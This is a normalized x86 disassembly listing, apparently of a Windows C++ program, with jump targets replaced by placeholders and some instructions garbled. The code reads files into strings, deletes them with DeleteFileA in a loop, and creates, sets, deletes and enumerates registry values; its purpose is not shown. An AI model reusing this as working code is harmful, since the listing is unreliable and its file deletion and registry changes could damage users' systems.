lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40d477
pop ecx
pop ecx
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xe8 ]
push edi
push eax
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x3bc ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40d477
pop ecx
pop ecx
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xf8 ]
push edi
push eax
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x3bc ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40d477
pop ecx
pop ecx
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
and [ ebp - 0x18 ] 0x0
mov ebx [ DeleteFileA@IAT ]
push 0x1
push 0x25
lea ecx [ ebp - 0xe8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea eax [ ebp - 0x48 ]
lea ecx [ ebp - 0x228 ]
push eax
mov [ ebp - 0x2 ] 0x1
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
push 0x6
mov esi eax
pop ecx
lea edi [ ebp - 0x90 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x90 ]
call sub_405288
push eax
call ??2@YAPAXI@Z
pop ecx
mov esi eax
push 0x0
push 0x0
lea ecx [ ebp - 0x228 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea ecx [ ebp - 0x90 ]
call sub_405288
push eax
push esi
lea ecx [ ebp - 0x228 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0x90 ]
call sub_405288
push eax
push esi
lea ecx [ ebp - 0xb8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea ecx [ ebp - 0x228 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push esi
call sub_40fc2c
pop ecx
lea ecx [ ebp - 0xc8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call ebx
push 0x1
push 0x25
lea ecx [ ebp - 0xf8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x198 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x198 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x2b8 ]
push eax
mov [ ebp - 0x4 ] 0x1
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
push 0x6
mov esi eax
pop ecx
lea edi [ ebp - 0xa8 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0xa8 ]
call sub_405288
push eax
call ??2@YAPAXI@Z
pop ecx
mov esi eax
push 0x0
push 0x0
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea ecx [ ebp - 0xa8 ]
call sub_405288
push eax
push esi
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0xa8 ]
call sub_405288
push eax
push esi
lea ecx [ ebp - 0x108 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push esi
call sub_40fc2c
pop ecx
lea ecx [ ebp - 0xe8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call ebx
cmp [ ebp - 0x2 ] 0x0
je r-xdata
lea eax [ ebp - 0x60 ]
lea ecx [ ebp - 0x198 ]
push eax
mov [ ebp - 0x3 ] 0x1
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
push 0x6
mov esi eax
pop ecx
lea edi [ ebp - 0x78 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x78 ]
call sub_405288
push eax
call ??2@YAPAXI@Z
pop ecx
mov esi eax
push 0x0
push 0x0
lea ecx [ ebp - 0x198 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea ecx [ ebp - 0x78 ]
call sub_405288
push eax
push esi
lea ecx [ ebp - 0x198 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0x78 ]
call sub_405288
push eax
push esi
lea ecx [ ebp - 0xd8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea ecx [ ebp - 0x198 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push esi
call sub_40fc2c
pop ecx
lea ecx [ ebp - 0xf8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call ebx
push 0x1f4
call [ Sleep@IAT ]
lea ecx [ ebp - 0x198 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x228 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0xa
jl r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x1
push 0x25
lea ecx [ ebp - 0xc8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x228 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x228 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
pop ecx
test al al
push 0x1
je r-xdata
lea ecx [ ebp - 0x198 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x2b8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x228 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
sub esp 0x10
lea eax [ ebp - 0xd8 ]
mov esi esp
lea ecx [ ebp - 0x108 ]
push eax
mov eax rw-data
push eax
push ecx
lea ecx [ ebp - 0xb8 ]
push eax
push ecx
lea ecx [ ebp + 0x18 ]
push eax
push ecx
push eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x88 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_4025ef
add esp 0x14
lea ecx [ ebp - 0x88 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
sub esp 0x10
lea eax [ ebp - 0xd8 ]
mov esi esp
lea ecx [ ebp - 0x108 ]
push eax
mov eax rw-data
push eax
push ecx
lea ecx [ ebp - 0xb8 ]
push eax
push ecx
lea ecx [ ebp + 0x18 ]
push eax
push ecx
push eax
lea eax [ ebp - 0x88 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x70 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x58 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_4025ef
add esp 0x14
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x88 ]
jmp r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xf8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xe8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xc8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xd8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x108 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_408e4e
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
xor esi esi
push 0x20019
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor al al
push edi
push esi
push esi
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
mov edi eax
call [ RegCloseKey@IAT ]
cmp edi esi
pop edi
sete al
jmp r-xdata
pop esi
pop ebp
retn
sub_408e97
push ebp
mov ebp esp
push ecx
push ecx
push 0x4
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
push eax
push 0x20019
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor al al
leave
retn
lea eax [ ebp - 0x4 ]
push esi
push eax
lea eax [ ebp - 0x8 ]
push [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
sete al
pop esi
leave
retn
sub_408ef1
push ebp
mov ebp esp
sub esp 0x404
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x400
push eax
push 0x20019
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x13 ]
push eax
push r--data
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
push 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
lea eax [ ebp + 0x13 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_408f64
push ebp
mov ebp esp
sub esp 0x40c
lea eax [ ebp + 0xc ]
push eax
push 0x20019
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor al al
leave
retn
lea eax [ ebp + 0x8 ]
push edi
push eax
push [ ebp + 0x14 ]
push 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
push [ ebp + 0xc ]
mov edi eax
call [ RegCloseKey@IAT ]
test edi edi
pop edi
jne r-xdata
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x40c ]
push [ ebp + 0x18 ]
call sub_4028eb
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40c ]
push [ ebp + 0x14 ]
call sub_40298e
mov al 0x1
leave
retn
sub_408fda
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
pop ebp
retn
push ebx
push esi
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
xor ebx ebx
push [ ebp + 0x24 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
lea ecx [ ebp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop esi
pop ebx
pop ebp
retn
mov bl 0x1
sub_409046
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor al al
pop ebp
retn
push esi
lea eax [ ebp + 0x14 ]
push 0x4
push eax
push 0x4
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
sete al
pop esi
pop ebp
retn
sub_40908b
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
xor al al
pop ebp
retn
push esi
lea eax [ ebp + 0x14 ]
push 0x8
push eax
push 0xb
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegSetValueExA@IAT ]
push [ ebp + 0xc ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
sete al
pop esi
pop ebp
retn
sub_4090d0
push ebp
mov ebp esp
sub esp 0x41c
push ebx
lea ecx [ ebp - 0x41c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
call sub_4028eb
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x41c ]
push [ ebp + 0x14 ]
push eax
call sub_402a2a
push 0x1
lea eax [ ebp - 0x10 ]
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408fda
add esp 0x20
lea ecx [ ebp - 0x10 ]
mov bl al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop ebx
leave
retn
sub_409132
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
push 0x2
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegDeleteValueA@IAT ]
neg eax
sbb al al
inc al
pop ebp
retn
xor al al
pop ebp
retn
sub_40926a
push ebp
mov ebp esp
mov eax 0x69d8
call sub_40fcf0
mov al [ r--data ]
push ebx
push edi
push 0x40
mov [ ebp - 0x1c8 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x1c7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x48 ]
xor ebx ebx
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push ebx
push eax
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x28 ] 0x104
push eax
mov [ ebp - 0x8 ] ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x1c ] 0x3fff
call [ RegQueryInfoKeyA@IAT ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
xor edi edi
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
pop edi
pop ebx
leave
retn
mov [ ebp - 0xc ] ebx
jbe r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x20 ] 0xff
push eax
push ebx
push ebx
lea eax [ ebp - 0x20 ]
push ebx
push eax
lea eax [ ebp - 0x2c8 ]
push eax
push edi
push [ ebp + 0x8 ]
call [ RegEnumKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea edi [ ebp - 0x33 ]
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x18 ] 0x2710
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] 0x3fff
push eax
lea eax [ ebp - 0x29d8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push ebx
push eax
lea eax [ ebp - 0x69d8 ]
mov [ ebp - 0x69d8 ] bl
push eax
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ RegEnumValueA@IAT ]
test eax eax
jne r-xdata
inc edi
cmp edi [ ebp - 0x8 ]
jb r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x64 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x2c8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea eax [ ebp - 0x34 ]
push 0xa
push eax
push [ ebp - 0x24 ]
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x1 ]
mov edi r--data
lea ecx [ ebp - 0x94 ]
push eax
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x69d8 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
